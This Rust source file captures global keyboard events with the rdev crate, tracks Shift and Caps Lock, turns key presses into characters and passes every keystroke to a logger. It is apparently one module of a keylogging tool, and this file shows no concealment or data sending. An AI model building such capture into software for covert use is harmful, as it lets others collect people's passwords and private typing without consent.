use rdev::{Key, EventType};
use std::collections::HashSet;
use std::sync::{Arc, Mutex};
use crate::logger::Logger;

#[derive(Clone)]
pub struct KeyState {
    pub shift_pressed: bool,
    pub caps_lock: bool,
    pub pressed_keys: HashSet<Key>,
}

impl KeyState {
    pub fn new() -> Self {
        Self {
            shift_pressed: false,
            caps_lock: false,
            pressed_keys: HashSet::new(),
        }
    }

    pub fn update(&mut self, event: &EventType) {
        match event {
            EventType::KeyPress(key) => {
                self.pressed_keys.insert(*key);
                if *key == Key::ShiftLeft || *key == Key::ShiftRight {
                    self.shift_pressed = true;
                } else if *key == Key::CapsLock {
                    self.caps_lock = !self.caps_lock;
                }
            }
            EventType::KeyRelease(key) => {
                self.pressed_keys.remove(key);
                if *key == Key::ShiftLeft || *key == Key::ShiftRight {
                    self.shift_pressed = false;
                }
            }
            _ => {}
        }
    }
}

pub fn key_to_char(key: Key, key_state: &KeyState) -> Option<String> {
    let base_char = match key {
        Key::KeyA => 'a',
        Key::KeyB => 'b',
        Key::KeyC => 'c',
        Key::KeyD => 'd',
        Key::KeyE => 'e',
        Key::KeyF => 'f',
        Key::KeyG => 'g',
        Key::KeyH => 'h',
        Key::KeyI => 'i',
        Key::KeyJ => 'j',
        Key::KeyK => 'k',
        Key::KeyL => 'l',
        Key::KeyM => 'm',
        Key::KeyN => 'n',
        Key::KeyO => 'o',
        Key::KeyP => 'p',
        Key::KeyQ => 'q',
        Key::KeyR => 'r',
        Key::KeyS => 's',
        Key::KeyT => 't',
        Key::KeyU => 'u',
        Key::KeyV => 'v',
        Key::KeyW => 'w',
        Key::KeyX => 'x',
        Key::KeyY => 'y',
        Key::KeyZ => 'z',
        Key::Num1 => '1',
        Key::Num2 => '2',
        Key::Num3 => '3',
        Key::Num4 => '4',
        Key::Num5 => '5',
        Key::Num6 => '6',
        Key::Num7 => '7',
        Key::Num8 => '8',
        Key::Num9 => '9',
        Key::Num0 => '0',
        Key::Minus => '-',
        Key::Equal => '=',
        Key::LeftBracket => '[',
        Key::RightBracket => ']',
        Key::BackSlash => '\\',
        Key::SemiColon => ';',
        Key::Quote => '\'',
        Key::Comma => ',',
        Key::Dot => '.',
        Key::Slash => '/',
        Key::Space => ' ',
        Key::Tab => '\t',
        Key::Return => '\n',
        Key::Backspace => '\x08',
        Key::Escape => '\x1b',
        _ => return None,
    };

    let is_upper = key_state.shift_pressed ^ key_state.caps_lock;
    let char = if is_upper && base_char.is_ascii_lowercase() {
        base_char.to_ascii_uppercase()
    } else if key_state.shift_pressed {
        match base_char {
            '1' => '!',
            '2' => '@',
            '3' => '#',
            '4' => '$',
            '5' => '%',
            '6' => '^',
            '7' => '&',
            '8' => '*',
            '9' => '(',
            '0' => ')',
            '-' => '_',
            '=' => '+',
            '[' => '{',
            ']' => '}',
            '\\' => '|',
            ';' => ':',
            '\'' => '"',
            ',' => '<',
            '.' => '>',
            '/' => '?',
            _ => base_char,
        }
    } else {
        base_char
    };

    Some(char.to_string())
}

pub fn handle_key_event(event: EventType, key_state: &Arc<Mutex<KeyState>>, logger: &Logger) {
    let mut ks = key_state.lock().unwrap();
    ks.update(&event);

    if let EventType::KeyPress(key) = event {
        if let Some(char) = key_to_char(key, &ks) {
            logger.log_keystroke(char);
        }
    }
}